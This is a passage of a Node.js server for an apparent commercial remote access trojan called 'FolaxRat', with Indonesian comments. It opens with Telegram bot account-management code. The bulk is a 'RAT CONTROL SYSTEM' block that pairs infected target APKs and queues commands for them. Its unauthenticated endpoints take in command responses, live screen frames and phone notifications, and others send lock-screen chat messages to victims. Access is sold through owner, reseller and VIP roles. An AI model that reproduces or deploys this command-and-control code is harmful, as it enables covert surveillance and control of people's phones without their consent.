      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ [SYSTEM] *ERROR: DIRECTORY NOT FOUND*\n\nTarget folder 'permenmd' does not exist.", { parse_mode: "Markdown" });
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    const responseMsg = deletedCount > 0 
      ? `🗑️ [SYSTEM] *GARBAGE COLLECTOR*\n\n✅ Purged ${deletedCount} corrupted/empty session folders.`
      : `✨ [SYSTEM] *NO JUNK FOUND*\n\nServer storage is clean.`;

    bot.sendMessage(chatId, responseMsg, { parse_mode: "Markdown" });
    console.log(`[LOG] Purged ${deletedCount} junk folders.`);
    
  } catch (err) {
    console.error("[ERROR] Cleanup failed:", err);
    bot.sendMessage(chatId, "⚠️ [SYSTEM] *CRITICAL ERROR*\n\nFailed to execute cleanup script.", { parse_mode: "Markdown" });
  }
});

bot.onText(/^\/?restart/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ Root access required for this action.", { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, "⚙️ [SERVER] *SYSTEM REBOOT*\n\nSending SIGTERM...\nReason: Manual Request\nStatus: *RESTARTING*...", { parse_mode: "Markdown" });
  await unfollowAllChannel();
  console.log("[SERVER] Manual restart triggered by Owner.");

  setTimeout(() => {
    process.exit(0);
  }, 2000);
});

setTimeout(async () => {
    await sendTelegramNotif(
      "✅ *[SERVER] SERVICES ONLINE*\n\n" +
      "System Status: *RUNNING*\n" +
      "Uptime: Just started\n" +
      "✅ All systems operational."
    );
  }, 3000);

// Kirim status server setiap 30 menit
setInterval(async () => {
  try {
    const uptimeSeconds = Math.floor(process.uptime());
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const uptimeStr = hours > 0 ? `${hours}j ${minutes}m` : `${minutes}m`;
    const waktuOnline = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    await sendTelegramNotif(
      "✅ *[SERVER] SERVICES ONLINE*\n\n" +
      "System Status: *RUNNING*\n" +
      `Uptime: ${uptimeStr}\n` +
      `🕐 Waktu: ${waktuOnline}\n` +
      "✅ All systems operational."
    );
  } catch (_) {}
}, 30 * 60 * 1000); // setiap 30 menit

// ═══════════════════════════════════════════════════════════
// 🧹 AUTO CLEAN — bersihkan file menumpuk secara otomatis
// ═══════════════════════════════════════════════════════════
async function runAutoClean() {
  console.log('[🧹 AUTO CLEAN] Mulai pembersihan...');
  let totalHapus = 0;

  try {
    // 1. Bersihkan logUser.txt kalau > 1MB
    const logUserPath = path.join(__dirname, 'logUser.txt');
    if (fs.existsSync(logUserPath)) {
      const sz = fs.statSync(logUserPath).size;
      fs.writeFileSync(logUserPath, '');
      console.log(`[🧹 AUTO CLEAN] logUser.txt direset (${(sz/1024).toFixed(1)} KB)`);
      totalHapus++;
    }

    // 2. Bersihkan user_logs/ — hapus file JSON > 7 hari atau > 500KB
    const logsDir = path.join(__dirname, 'user_logs');
    if (fs.existsSync(logsDir)) {
      const logFiles = fs.readdirSync(logsDir);
      const now = Date.now();
      for (const f of logFiles) {
        const fp = path.join(logsDir, f);
        try {
          const stat = fs.statSync(fp);
          const ageMs = now - stat.mtimeMs;
          const ageDays = ageMs / (1000 * 60 * 60 * 24);
          if (ageDays > 7 || stat.size > 500 * 1024) {
            fs.rmSync(fp, { force: true });
            totalHapus++;
            console.log(`[🧹 AUTO CLEAN] Hapus log: ${f} (${ageDays.toFixed(1)} hari, ${(stat.size/1024).toFixed(1)} KB)`);
          }
        } catch (_) {}
      }
    }

    // 3. Bersihkan session kosong di permenmd/
    const sessionBase = path.join(__dirname, 'permenmd', 'permenmd');
    if (fs.existsSync(sessionBase)) {
      const userFolders = fs.readdirSync(sessionBase);
      for (const uf of userFolders) {
        const ufPath = path.join(sessionBase, uf);
        try {
          if (!fs.lstatSync(ufPath).isDirectory()) continue;
          const files = fs.readdirSync(ufPath);
          const hasJson = files.some(f => f.endsWith('.json'));
          if (!hasJson) {
            fs.rmSync(ufPath, { recursive: true, force: true });
            totalHapus++;
            console.log(`[🧹 AUTO CLEAN] Hapus session kosong: ${uf}`);
          }
        } catch (_) {}
      }
    }

    // 5. Bersihkan folder temp/cache Node.js yang tidak perlu
    const tmpDirs = ['tmp', 'temp', '.cache'];
    for (const d of tmpDirs) {
      const dp = path.join(__dirname, d);
      if (fs.existsSync(dp)) {
        try {
          fs.rmSync(dp, { recursive: true, force: true });
          totalHapus++;
          console.log(`[🧹 AUTO CLEAN] Hapus folder temp: ${d}`);
        } catch (_) {}
      }
    }

    console.log(`[🧹 AUTO CLEAN] Selesai. Total item dibersihkan: ${totalHapus}`);

    // Kirim notif ke Telegram
    try {
      const waktuClean = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
      const notifClean =
        `🧹 *AUTO CLEAN SELESAI*\n\n` +
        `🗑 *Item Dibersihkan:* ${totalHapus}\n` +
        `🕐 *Waktu:* ${waktuClean}\n` +
        `✅ *Status:* Server berjalan normal\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🔹 *FolaxRat Project*`;
      await sendTelegramNotif(notifClean);
    } catch (_) {}

  } catch (err) {
    console.error('[🧹 AUTO CLEAN] Error:', err.message);
  }
}



// ===== Start Express Server =====
server.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server aktif di http://yanzoffc-private.sano.biz.id:${PORT}`);
  startVipSessions();
  startUserSessions();

  console.log(`[✅ SERVER] FolaxRat ready — semua fitur aktif.`);


// ════════════════════════════════════════════════════════════════════════════
// ██████████  RAT CONTROL SYSTEM  ██████████████████████████████████████████
// ════════════════════════════════════════════════════════════════════════════

const RAT_TARGETS = './rat_targets.json';
const RAT_LIVE    = {};
const RAT_ALLOWED = ['owner','high owner','high admin','admin','vip','reseller'];

function readRat(f) {
  try { return JSON.parse(fs.existsSync(f) ? fs.readFileSync(f,'utf8')||'[]' : '[]'); } catch { return []; }
}
function saveRat(f,d) { try { fs.writeFileSync(f, JSON.stringify(d,null,2)); } catch(_) {} }
function genPairId() { return crypto.randomBytes(8).toString('hex').toUpperCase(); }

// ── Role Guard: blok member ─────────────────────────────────────────────────
function ratGuard(req, res, next) {
  const key = req.query.key || req.body?.key;
  const user = getUserObjectByKey(key);
  if (!user) return res.json({ valid: false, message: 'Invalid key' });
  const role = (user.role || '').toLowerCase();
  if (!RAT_ALLOWED.includes(role)) return res.json({ valid: false, message: 'Akses ditolak. Fitur RAT hanya untuk Owner, Admin, VIP, dan Reseller.' });
  req._ratUser = user;
  next();
}

// ── Startup: generate pairId untuk semua user yang belum punya ──────────────
(function generateAllPairIds() {
  try {
    const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
    let changed = false;
    for (let i = 0; i < db.length; i++) {
      if (!db[i].pairId) { db[i].pairId = genPairId(); changed = true; console.log(`[RAT-STARTUP] pairId generated: ${db[i].username} → ${db[i].pairId}`); }
    }
    if (changed) fs.writeFileSync('./database.json', JSON.stringify(db,null,2));
    else console.log('[RAT-STARTUP] All users already have pairId');
  } catch(e) { console.error('[RAT-STARTUP] Error:', e.message); }
})();

// ── Device Permission Endpoints ─────────────────────────────────────────────
app.get('/devicePerms', ratGuard, (req, res) => {
  const { username } = req.query;
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '{}');
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  const role = (req._ratUser.role||'').toLowerCase();
  const isHighRole = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
  // Jika yang dicek adalah diri sendiri dan role tinggi → auto approve
  if (isHighRole && (!username || username === req._ratUser.username)) {
    return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
  }
  const ownerPerms = perms[req._ratUser.username] || {};
  const targetPerm = ownerPerms[username] || { approved: false, allDevices: false, devices: [] };
  res.json({ valid: true, ...targetPerm });
});

app.post('/setDevicePerm', ratGuard, (req, res) => {
  const { username, approved, allDevices, devices } = req.body;
  const role = (req._ratUser.role||'').toLowerCase();
  const canSetPerm = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
  if (!canSetPerm) return res.json({ valid: false, message: 'Role tidak diizinkan set permission' });
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  if (!perms[req._ratUser.username]) perms[req._ratUser.username] = {};
  perms[req._ratUser.username][username] = { approved: !!approved, allDevices: !!allDevices, devices: devices||[] };
  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
  res.json({ valid: true });
});

app.get('/listDevicePerms', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  const canList = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
  if (!canList) return res.json({ valid: false, message: 'Role tidak diizinkan' });
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  res.json({ valid: true, perms: perms[req._ratUser.username] || {} });
});

app.get('/api/device/getPerms',  ratGuard, (req, res) => { req.url = '/devicePerms?'   + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/device/setPerm',  ratGuard, (req, res) => { req.url = '/setDevicePerm?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/device/listPerms', ratGuard, (req, res) => { req.url = '/listDevicePerms?'+(req.url.split('?')[1]||''); app.handle(req, res); });

// ── RAT Core Endpoints ──────────────────────────────────────────────────────
app.get('/rat/pairid', ratGuard, (req, res) => {
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const idx = db.findIndex(u => u.username === req._ratUser.username);
  if (idx === -1) return res.json({ valid: false, message: 'User not found' });
  if (!db[idx].pairId) { db[idx].pairId = genPairId(); fs.writeFileSync('./database.json', JSON.stringify(db,null,2)); }
  res.json({ valid: true, pairId: db[idx].pairId });
});

app.post('/rat/grant-member', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  const canGrant = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
  if (!canGrant) return res.json({ valid: false, message: 'Role tidak diizinkan grant akses' });
  const { memberUsername } = req.body;
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  if (!perms[req._ratUser.username]) perms[req._ratUser.username] = {};
  perms[req._ratUser.username][memberUsername] = { approved: true, allDevices: true, devices: [] };
  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
  res.json({ valid: true });
});

app.post('/rat/revoke-member', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  const canRevoke = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
  if (!canRevoke) return res.json({ valid: false, message: 'Role tidak diizinkan revoke akses' });
  const { memberUsername } = req.body;
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  if (perms[req._ratUser.username]) delete perms[req._ratUser.username][memberUsername];
  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
  res.json({ valid: true });
});

app.get('/rat/my-devices', ratGuard, (req, res) => {
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const user = req._ratUser;
  const targets = readRat(RAT_TARGETS);
  const role = (user.role||'').toLowerCase();
  const isOwnerLevel = ['owner','high owner'].includes(role);
  const isAdminLevel = ['high admin','admin'].includes(role);
  const isResellerVip = ['reseller','vip'].includes(role);
  let devices;

  if (isOwnerLevel || isAdminLevel || isResellerVip) {
    // Semua role tinggi langsung pakai pairId sendiri → lihat device milik sendiri
    const dbUser = db.find(u => u.username === user.username);
    if (!dbUser) return res.json({ valid: true, devices: [] });
    // Auto-approve diri sendiri di rat_perms supaya APK tidak tampilkan "Akses belum disetujui"
    try {
      const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
      if (!perms[user.username]) perms[user.username] = {};
      if (!perms[user.username][user.username]) {
        perms[user.username][user.username] = { approved: true, allDevices: true, devices: [] };
        fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
      }
    } catch(_) {}
    devices = targets.filter(t => t.ownerPairId === dbUser.pairId);
  } else {
    // Member atau role lain → cek perms dari owner
    const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
    const ownerEntry = Object.entries(perms).find(([,p]) => p[user.username]?.approved);
    if (!ownerEntry) return res.json({ valid: true, devices: [] });
    const [ownerName, ownerPerms] = ownerEntry;
    const perm = ownerPerms[user.username];
    const ownerUser = db.find(u => u.username === ownerName);
    const ownerDevices = targets.filter(t => t.ownerPairId === ownerUser?.pairId);
    devices = perm.allDevices ? ownerDevices : ownerDevices.filter(d => perm.devices?.includes(d.id));
  }
  res.json({ valid: true, devices });
});

// ── Pair + Command + Response ────────────────────────────────────────────────
app.post('/api/pair-target', (req, res) => {
  // Endpoint ini dipanggil dari APK target (bukan dari user login), jadi pakai pairId bukan sessionKey
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId) return res.status(400).json({ error: 'Missing fields' });
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const owner = db.find(u => u.pairId === pairId);
  if (!owner) return res.status(403).json({ error: 'Invalid pairId' });
  let t = readRat(RAT_TARGETS);
  const idx = t.findIndex(d => d.id === deviceId);
  const entry = { id: deviceId, model: model||'Unknown', battery: battery||'?', ownerPairId: pairId, lastSeen: new Date().toISOString() };
  if (idx >= 0) t[idx] = { ...t[idx], ...entry }; else t.push(entry);
  saveRat(RAT_TARGETS, t);
  res.json({ valid: true, message: 'Paired' });
});

app.post('/api/send-command', ratGuard, (req, res) => {
  const { id, command, extra } = req.body;
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.id !== id);
  cmds.push({ id, command, extra: extra||'', ts: Date.now() });
  saveRat('./rat_commands.json', cmds);
  res.json({ valid: true });
});

app.get('/api/get-command/:id', (req, res) => {
  // Dipanggil dari APK target, no auth needed
  let cmds = readRat('./rat_commands.json');
  const cmd = cmds.find(c => c.id === req.params.id);
  if (!cmd) return res.json({});
  cmds = cmds.filter(c => c.id !== req.params.id);
  saveRat('./rat_commands.json', cmds);
  let t = readRat(RAT_TARGETS);
  const idx = t.findIndex(d => d.id === req.params.id);
  if (idx >= 0) { t[idx].lastSeen = new Date().toISOString(); saveRat(RAT_TARGETS, t); }
  res.json(cmd);
});

app.post('/api/post-response/:id', (req, res) => {
  // Dari APK target, no auth
  let resp = readRat('./rat_responses.json');
  resp = resp.filter(r => r.id !== req.params.id);
  resp.push({ id: req.params.id, cmd: req.body.cmd||'', data: req.body.data||{}, ts: Date.now() });
  saveRat('./rat_responses.json', resp);
  res.json({ valid: true });
});

app.get('/api/get-response/:id', ratGuard, (req, res) => {
  const resp = readRat('./rat_responses.json');
  const r = resp.find(r => r.id === req.params.id);
  res.json(r || {});
});

// ── Live Frame ───────────────────────────────────────────────────────────────
app.post('/api/live-frame/:id', (req, res) => {
  // Dari APK target, no auth
  const { frame, ts } = req.body;
  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ valid: true });
});

app.get('/api/live-frame/:id', ratGuard, (req, res) => {
  const d = RAT_LIVE[req.params.id];
  if (!d || Date.now() - d.ts > 5000) return res.json({ frame: '' });
  res.json({ frame: d.frame });
});

// ── Notifications ────────────────────────────────────────────────────────────
app.post('/api/post-notification/:id', (req, res) => {
  // Dari APK target, no auth
  let notifs = readRat('./rat_notifs.json');
  notifs.push({ id: req.params.id, ...req.body, ts: Date.now() });
  if (notifs.length > 200) notifs = notifs.slice(-200);
  saveRat('./rat_notifs.json', notifs);
  res.json({ valid: true });
});

app.get('/api/get-notifications/:id', ratGuard, (req, res) => {
  const notifs = readRat('./rat_notifs.json');
  res.json(notifs.filter(n => n.id === req.params.id).slice(-50));
});

// ── Lock Chat ────────────────────────────────────────────────────────────────
app.post('/api/lock-chat/:id', ratGuard, (req, res) => {
  let chats = readRat('./rat_chats.json');
  if (!Array.isArray(chats)) chats = [];
  chats.push({ id: req.params.id, from: req.body.from||'owner', text: req.body.text||'', time: new Date().toLocaleTimeString('id-ID') });
  if (chats.length > 500) chats = chats.slice(-500);
  saveRat('./rat_chats.json', chats);
  res.json({ valid: true });
});

app.get('/api/lock-chat/:id', (req, res) => {
  // Dari APK target boleh baca chat
  const chats = readRat('./rat_chats.json');
  const last = chats.filter(c => c.id === req.params.id).slice(-1)[0];
  res.json(last || {});
});

app.get('/api/lock-chat-all/:id', ratGuard, (req, res) => {
  const chats = readRat('./rat_chats.json');
  res.json({ messages: chats.filter(c => c.id === req.params.id).slice(-100) });
});

app.delete('/api/lock-chat/:id', ratGuard, (req, res) => {
  let chats = readRat('./rat_chats.json');
  chats = chats.filter(c => c.id !== req.params.id);
  saveRat('./rat_chats.json', chats);
  res.json({ valid: true });
});

// ── Auto cleanup setiap jam ───────────────────────────────────────────────────
['rat_targets','rat_commands','rat_responses','rat_notifs'].forEach(f => {
  setInterval(() => {
    try {
      let data = readRat(`./${f}.json`);
      const now = Date.now();
      if (f === 'rat_commands')  data = data.filter(d => now - (d.ts||0) < 60000);
      if (f === 'rat_responses') data = data.filter(d => now - (d.ts||0) < 120000);
      saveRat(`./${f}.json`, data);
    } catch(_) {}
  }, 3600000);
});

// ── Admin RAT endpoints ──────────────────────────────────────────────────────
app.get('/admin/listpairids', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  if (!['owner','high owner','high admin','admin'].includes(role)) return res.json({ valid: false, message: 'Minimal role Admin' });
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  res.json({ valid: true, users: db.map(u => ({ username: u.username, pairId: u.pairId||null })) });
});

app.get('/admin/genpairid', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  if (!['owner','high owner','high admin','admin'].includes(role)) return res.json({ valid: false, message: 'Minimal role Admin' });
  const { username } = req.query;
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const idx = db.findIndex(u => u.username === username);
  if (idx === -1) return res.json({ valid: false, message: 'User not found' });
  db[idx].pairId = genPairId();
  fs.writeFileSync('./database.json', JSON.stringify(db,null,2));
  res.json({ valid: true, pairId: db[idx].pairId });
});

// ════════════════════════════════════════════════════════════════════════════
// ██████████  END RAT CONTROL SYSTEM  ████████████████████████████████████████
// ════════════════════════════════════════════════════════════════════════════
})